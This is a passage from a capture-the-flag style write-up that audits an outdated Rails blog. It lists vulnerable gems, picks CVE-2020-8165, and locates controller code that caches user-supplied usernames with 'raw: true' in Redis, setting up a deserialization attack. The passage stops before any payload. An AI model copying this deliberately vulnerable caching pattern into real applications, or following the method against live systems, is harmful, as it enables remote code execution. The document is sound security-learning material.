19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="source-code-analysis">Source code analysis<a href="#source-code-analysis" class="hash-link" aria-label="Direct link to Source code analysis" title="Direct link to Source code analysis">​</a></h2><p>Let&#x27;s install a ruby and bundle version matching the one specified in the Gemfile:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ asdf install ruby 2.5.5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ asdf local ruby 2.5.5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ gem install bundler:1.17.3</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It&#x27;s not mandatory to analyse the source code but it will allow use to run the
website is we want to do some test or even the run <code>bundle outdated</code> to check
for outdated dependencies.</p><p>Before we do that, we can see in <code>config.ru</code> that the blog is a RoR app
(using Ruby on Rails web framework).</p><p>Let&#x27;s see if the project is up to date:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ bundle outdated</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Outdated gems included in the bundle:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * actioncable (newest 6.1.3, installed 5.2.2.1)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * actionmailer (newest 6.1.3, installed 5.2.2.1)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * actionpack (newest 6.1.3, installed 5.2.2.1)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * actionview (newest 6.1.3, installed 5.2.2.1)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * activejob (newest 6.1.3, installed 5.2.2.1)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * activemodel (newest 6.1.3, installed 5.2.2.1)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * activerecord (newest 6.1.3, installed 5.2.2.1)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * activestorage (newest 6.1.3, installed 5.2.2.1)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * activesupport (newest 6.1.3, installed 5.2.2.1)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * autoprefixer-rails (newest 10.2.4.0, installed 9.8.6.3)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * bcrypt (newest 3.1.16, installed 3.1.15, requested ~&gt; 3.1.7) in groups &quot;default&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * bootsnap (newest 1.7.2, installed 1.4.8) in groups &quot;default&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * bootstrap (newest 4.6.0, installed 4.5.2, requested ~&gt; 4.5.0) in groups &quot;default&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * capybara (newest 3.35.3, installed 3.33.0) in groups &quot;test&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * childprocess (newest 4.0.0, installed 3.0.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * coffee-rails (newest 5.0.0, installed 4.2.2, requested ~&gt; 4.2) in groups &quot;default&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * concurrent-ruby (newest 1.1.8, installed 1.1.7)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * erubi (newest 1.10.0, installed 1.9.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * ffi (newest 1.14.2, installed 1.13.1)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * i18n (newest 1.8.9, installed 1.8.5)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * jbuilder (newest 2.11.2, installed 2.10.0, requested ~&gt; 2.5) in groups &quot;default&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * jquery-rails (newest 4.4.0, installed 4.3.3, requested = 4.3.3) in groups &quot;default&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * listen (newest 3.4.1, installed 3.1.5, requested &lt; 3.2, &gt;= 3.0.5) in groups &quot;development&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * loofah (newest 2.9.0, installed 2.6.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * mini_portile2 (newest 2.5.0, installed 2.4.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * minitest (newest 5.14.3, installed 5.14.1)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * msgpack (newest 1.4.2, installed 1.3.3)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * nio4r (newest 2.5.5, installed 2.5.2)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * nokogiri (newest 1.11.1, installed 1.10.10)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * popper_js (newest 2.6.0, installed 1.16.0, requested = 1.16.0) in groups &quot;default&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * public_suffix (newest 4.0.6, installed 4.0.5)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * puma (newest 5.2.1, installed 3.12.6, requested ~&gt; 3.11) in groups &quot;default&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * rails (newest 6.1.3, installed 5.2.2.1, requested = 5.2.2.1) in groups &quot;default&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * railties (newest 6.1.3, installed 5.2.2.1)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * rake (newest 13.0.3, installed 13.0.1)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * redis (newest 4.2.5, installed 4.2.1, requested ~&gt; 4.0) in groups &quot;default&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * regexp_parser (newest 2.0.3, installed 1.7.1)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * sass-rails (newest 6.0.0, installed 5.1.0, requested ~&gt; 5.0) in groups &quot;default&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * sprockets (newest 4.0.2, installed 3.7.2)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * sprockets-rails (newest 3.2.2, installed 3.2.1)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * thor (newest 1.1.0, installed 1.0.1)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * tzinfo (newest 2.0.4, installed 1.2.7)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * web-console (newest 4.1.0, installed 3.7.0) in groups &quot;development&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Seems that all dependencies are very outdated. We can install <code>bundler-audit</code>,
which is an equivalent for Ruby to <code>npm audit</code> in Nodejs, to check for CVE
impacting the dependencies.</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ gem install bundler-audit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ bundle-audit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Name: actionpack</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Version: 5.2.2.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Advisory: CVE-2020-8166</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Criticality: Unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">URL: https://groups.google.com/forum/#!topic/rubyonrails-security/NOjKiGeXUgw</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Title: Ability to forge per-form CSRF tokens given a global CSRF token</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Solution: upgrade to ~&gt; 5.2.4.3, &gt;= 6.0.3.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Name: actionpack</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Version: 5.2.2.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Advisory: CVE-2020-8164</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Criticality: Unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">URL: https://groups.google.com/forum/#!topic/rubyonrails-security/f6ioe4sdpbY</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Title: Possible Strong Parameters Bypass in ActionPack</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Solution: upgrade to ~&gt; 5.2.4.3, &gt;= 6.0.3.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Name: actionview</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Version: 5.2.2.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Advisory: CVE-2020-5267</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Criticality: Unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">URL: https://groups.google.com/forum/#!topic/rubyonrails-security/55reWMM_Pg8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Title: Possible XSS vulnerability in ActionView</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Solution: upgrade to &gt;= 5.2.4.2, ~&gt; 5.2.4, &gt;= 6.0.2.2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Name: actionview</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Version: 5.2.2.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Advisory: CVE-2020-8167</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Criticality: Unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">URL: https://groups.google.com/forum/#!topic/rubyonrails-security/x9DixQDG9a0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Title: CSRF Vulnerability in rails-ujs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Solution: upgrade to ~&gt; 5.2.4.3, &gt;= 6.0.3.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Name: activestorage</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Version: 5.2.2.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Advisory: CVE-2020-8162</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Criticality: Unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">URL: https://groups.google.com/forum/#!topic/rubyonrails-security/PjU3946mreQ</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Title: Circumvention of file size limits in ActiveStorage</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Solution: upgrade to ~&gt; 5.2.4.3, &gt;= 6.0.3.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Name: activesupport</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Version: 5.2.2.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Advisory: CVE-2020-8165</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Criticality: Unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">URL: https://groups.google.com/forum/#!topic/rubyonrails-security/bv6fW4S0Y1c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Title: Potentially unintended unmarshalling of user-provided objects in MemCacheStore and RedisCacheStore</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Solution: upgrade to ~&gt; 5.2.4.3, &gt;= 6.0.3.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Name: jquery-rails</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Version: 4.3.3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Advisory: CVE-2019-11358</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Criticality: Medium</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">URL: https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Title: Prototype pollution attack through jQuery $.extend</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Solution: upgrade to &gt;= 4.3.4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Vulnerabilities found!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The one one activesupport seems to be the most promising because unmarshalling
is a kind of deserialization that can lead to RCE:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Name: activesupport</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Version: 5.2.2.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Advisory: CVE-2020-8165</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Criticality: Unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">URL: https://groups.google.com/forum/#!topic/rubyonrails-security/bv6fW4S0Y1c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Title: Potentially unintended unmarshalling of user-provided objects in MemCacheStore and RedisCacheStore</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Solution: upgrade to ~&gt; 5.2.4.3, &gt;= 6.0.3.1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><blockquote><p>A deserialization of untrusted data vulnernerability exists in rails &lt; 5.2.4.3, rails &lt; 6.0.3.1 that can allow an attacker to unmarshal user-provided objects in MemCacheStore and RedisCacheStore potentially resulting in an RCE.</p><p>Ref. <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-8165" target="_blank" rel="noopener noreferrer">CVE-2020-8165</a></p></blockquote><p>We sure have a vulnerable version of Rails:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ grep &quot;&#x27;rails&#x27;&quot; Gemfile</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Bundle edge Rails instead: gem &#x27;rails&#x27;, github: &#x27;rails/rails&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gem &#x27;rails&#x27;, &#x27;= 5.2.2.1&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The References section of CVE-2020-8165 page on NVD gives a link to a
<a href="https://hackerone.com/reports/413388" target="_blank" rel="noopener noreferrer">HackerOne report</a> tagged as <em>exploit</em>
in addition to the many <em>mailing list</em>.</p><p><img loading="lazy" src="https://i.imgur.com/eMHoziB.png" class="img_ev3q"></p><p>By reading the H1 report, we can read:</p><blockquote><p>This vulnerability effects application code that caches a string from an untrusted source using the <code>raw: true</code> option.</p></blockquote><p>So let&#x27;s find if the option is used in the code:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ grep -rn &#x27;raw: true&#x27; app</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">app/controllers/application_controller.rb:32:      @current_username = cache.fetch(&quot;username_#{session[:user_id]}&quot;, raw: true) do</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">app/controllers/users_controller.rb:37:      @current_username = cache.fetch(&quot;username_#{session[:user_id]}&quot;, raw: true) {user_params[:username]}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>app/controllers/users_controller.rb</code> L32-L49</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">  def update</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    @user = User.find(params[:id])</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    if @user &amp;&amp; @user == current_user</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      cache = ActiveSupport::Cache::RedisCacheStore.new(url: &quot;redis://127.0.0.1:6379/0&quot;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      cache.delete(&quot;username_#{session[:user_id]}&quot;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      @current_username = cache.fetch(&quot;username_#{session[:user_id]}&quot;, raw: true) {user_params[:username]}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      if @user.update(user_params)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        flash[:success] = &quot;Your account was updated successfully&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        redirect_to articles_path</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      else</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        cache.delete(&quot;username_#{session[:user_id]}&quot;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        render &#x27;edit&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      end</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    else</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      flash[:danger] = &quot;Not authorized&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      redirect_to articles_path</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    end</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  end</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The <code>update</code> method will cache a key <code>username_&lt;user_id&gt;</code> using <code>user_params[:username]</code>
which is user supplied and so untrusted.
It will cache the value and then try to update the database but if it fails it will
remove the cached value.</p><p><code>app/controllers/application_controller.rb</code> L29-L40</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">  def current_username</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    if session[:user_id]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      cache = ActiveSupport::Cache::RedisCacheStore.new(url: &quot;redis://127.0.0.1:6379/0&quot;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      @current_username = cache.fetch(&quot;username_#{session[:user_id]}&quot;, raw: true) do</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        @current_user = current_user</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        @current_username = @current_user.username</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      end</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    else</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      @current_username = &quot;guest&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    end</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    return @current_username</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  end</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The key is also fetched with <code>current_username</code> method.</p><p>Let&#x27;s see what is the format of an username to know if we can poison it.</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ grep -rn &#x27;:username&#x27; app</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">app/views/users/_form.html.erb:7:    &lt;%= f.label :username %&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">app/views/users/_form.html.erb:8:    &lt;%= f.text_field :username, class: &quot;form-control&quot;, placeholder: &quot;Username&quot;, autofocus: true %&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">app/views/users/edit.html.erb:10:    &lt;%= f.label :username %&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">app/views/users/edit.html.erb:11:    &lt;%= f.text_field :username, class: &quot;form-control&quot;, placeholder: &quot;Username&quot;, autofocus: true %&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">app/controllers/users_controller.rb:37:      @current_username = cache.fetch(&quot;username_#{session[:user_id]}&quot;, raw: true) {user_params[:username]}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">app/controllers/users_controller.rb:53:    params.require(:user).permit(:username, :email, :password)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">app/models/user.rb:6: validates :username, presence: true, uniqueness: { case_sensitive: false }, length: { minimum: 3, maximum: 25 },</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The user class must be defined in <code>app/models/user.rb</code>.</p><p><code>app/models/user.rb</code> L1-L11</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">class User &lt; 